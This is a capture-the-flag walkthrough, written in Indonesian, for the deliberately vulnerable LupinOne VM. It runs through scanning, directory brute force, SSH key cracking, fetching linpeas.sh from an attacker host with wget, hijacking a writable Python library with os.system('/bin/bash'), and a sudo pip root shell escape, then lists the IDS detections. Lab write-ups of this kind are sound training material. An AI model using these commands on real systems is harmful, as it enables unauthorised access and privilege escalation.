# CTF LUPINONE 
Vulnerable Server: [LupinOne](https://www.vulnhub.com/entry/empire-lupinone,750/)

## Requirement
- [Virtual Box](https://www.virtualbox.org/)
- [Kali linux](https://www.kali.org/get-kali/#kali-virtual-machines)
- [OPNsense](https://opnsense.org/) (optional)
- [LupinOne](https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip)

## Arsitektur Lab

## Setup Vulnerable Server
- Download file zip di link https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip
- Setelah berhasil didownload, klik kanan file zip tersebut lalu pilih Extract Here
- Setelah proses ekstrak berhasil akan terdapat folder `01 - Empire Lupin One` yang berisi file berikut
- Buka aplikasi Virtual Box lalu klik tombol **New**

- Beri nama `Lupin One` lalu pilih folder tempat penyimpanan virtual machine. Pada field Type pilih **Linux** dan pada field Version pilih **Other Linux (64 bit)**. Jika sudah tekan tombol **Next**

- Selanjutnya buat base memory menjadi 1024 MB dan tekan tombol **Next**

- Selanjutnya pilih opsi **Use an Existing Virtual Hard Disk File** jika hard disk belum ditambahkan anda bisa klik icon folder berikut

- Lalu tekan tombol **Add**

- Arahkan ke lokasi hasil ekstraksi diatas, lalu pilih hard disk virtual dan tekan tombol **Open**

- Selanjutnya tekan **Choose**, jika hard disk virtual sudah terpilih seperti ini tekan tombol **Next** lalu tekan tombol **Finish** 

## Penyelesaian
- Melakukan konfigurasi routing pada Kali Linux
```sh
ip route add 192.168.1.0/24 via 192.168.100.7
```

- Menemukan IP Address target
```sh
nmap -sn 192.168.1.0/24
```

- Melakukan Port Scanning pada target 
```sh
nmap -sC -sV 192.168.1.107
```

- Sekarang kita coba buka halaman web lewat browser dengan URL `http://<IP_server>` 

- Buka file `robots.txt` dengan URL `http://<IP_server>/robots.txt`

- Jika kita buka halaman `/~myfiles` dengan URL `http://<IP_Server>/~myfiles`halaman tersebut tidak berisi apa-apa

- Melakukan web directory brute force dengan tool `ffuf` untuk melihat ada halaman apa saja didalam website target
```sh
ffuf -c -u http://192.168.1.107/~FUZZ -w /usr/share/wordlists/dirb/common.txt
```

- Dari hasil web directory brute force diatas ditemukan halaman `/~secret/`. Jika kita buka dengan URL `http://<IP_Server>/~secret` isi halaman tersebut adalah sebagai berikut

- Dari uraian petunjuk diatas, terdapat halaman tersembunyi yang berisi kunci SSH dan nama usernya adalah `icex64`
- Sekarang kita lakukan web directory brute force dengan tool `ffuf` untuk menemukan halaman tersembunyi yang berisi kunci SSH
```sh
ffuf -c -ic -u http://192.168.1.107/~secret/.FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 403 -e .html,.txt
```
- Dari hasil web directory brute force diatas ditemukan halaman `/~secret/.mysecret.txt`. Jika kita buka dengan URL `http://<IP_Server>/~secret/.mysecret.txt` isi halaman tersebut adalah sebagai berikut

- Kunci tersebut sepertinya dalam kondisi terencode. Setelah kita mencoba beberapa algoritma, kunci tersebut berhasil terdecode menggunakan base58
- Buka tool Cyber Chef https://gchq.github.io/CyberChef/ di tab baru

- Ketik `base58` di field Search lalu drag label `From Base58` ke kolom Recipe

- Copy kunci diatas lalu paste di kolom Input

- Buat file dengan nama `ssh_key.rsa` menggunakan editor nano lalu paste hasil decode kunci diatas. Tekan `Ctrl+O` lalu enter untuk menyimpan dan tekan `Ctrl+X` untuk keluar
```sh
nano ssh_key.rsa
```

- Ekstrak hash dari file `ssh_key.rsa` menggunakan tool `ssh2john` dan simpan dengan nama file `hash`
```sh
ssh2john ssh_key.rsa > hash
```

- Crack hash tersebut menggunakan tool `john the ripper` dan menggunakan wordlist `fasttrack.txt` sesuai petunjuk di halaman web `http://<IP_Server>/~secret`
```sh
john --wordlist=/usr/share/wordlists/fasttrack.txt.txt hash
```

- Ubah permission file `ssh_key.rsa` menjadi read dan write saja
```sh
chmod 600 ssh_key.rsa
```

- Sekarang kita sudah memiliki file `ssh_key.rsa` sebagai kunci SSH beserta passphrase dan nama user `icex64` sehingga kita tinggal mengakses SSH server dengan informasi tersebut. Jika anda diminta konfirmasi untuk meneruskan koneksi silahkan ketik `yes` lalu masukkan password diatas
```sh
ssh -i ssh_key.rsa icex64@<IP_Server>
```

- Kita berhasil menemukan user flag di direktori `/home/icex64`
```sh
cat /home/icex64/user.txt
```

- Melakukan pengecekan akses `sudo` yang dimiliki user `icex64`
```sh
sudo -l
```

- Disini user `icex64` bisa menjalankan file `/home/arsene/heist.py`, setelah dibuka program tersebut menggunakan library python `webbrowser`. Namun sayangnya kita tidak dapat menemukan tempat library `webbrowser` disimpan menggunakan perintah `locate`
```sh
cat /home/arsene/heist.py
```

- Unduh program [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master) untuk menemukan jalur privilage escalation di linux
- Buka terminal baru, ketik perintah `ifconfig` untuk melihat IP Kali Linux dan serving program `linpeas.sh` menggunakan python
```sh
ifconfig
python3 -m http.server 80
```

- Unduh program `linpeas.sh`
```sh
cd /tmp
wget <IP_Attacker>/linpeas.sh
```

- Setelah berhasil terunduh, beri permission execute pada file `linpeas.sh` lalu jalankan file tersebut
```sh
chmod +x linpeas.sh
./linpeas.sh
```

- Lokasi file `webbrowser.py` ditemukan dan file itu ternyata bisa diakses oleh siapa saja
```sh
ls -la /usr/lib/python3.9/webbrowser.py
```

- Edit file `webbrowser.py` menggunakan editor nano
```sh
nano /usr/lib/python3.9/webbrowser.py
```
- Lalu sisipkan kode berikut ini. Tekan `Ctrl+O` lalu enter untuk menyimpan dan tekan `Ctrl+X` untuk keluar
```sh
os.system("/bin/bash")
```

- Switch ke user `arsene` menggunakan `heist.py`
```sh
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

- Melakukan pengecekan akses `sudo` yang dimiliki user `arsene`
```sh
sudo -l
```

- User `arsene` memiliki akses sudo ke user root melalui service `/usr/bin/pip`. Menurut referensi di web https://gtfobins.github.io/gtfobins/pip/ cara melakukan privilage escalation adalah sebagai berikut

- Jalankan satu persatu baris perintah diatas untuk mendapatkan akses root
```sh
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

- Kita berhasil menemukan root flag
```sh
cat /root/root.txt
```

## Hasil IDS OPNsense
- Deteksi penggunaan tool nmap pada server

- Deteksi pengunduhan script linpeas.sh pada server

## Peringatan
Semua materi yang disajikan disini hanya digunakan sebagai media pembelajaran. Penulis tidak bertanggung jawab atas penyalahgunaan dari materi tersebut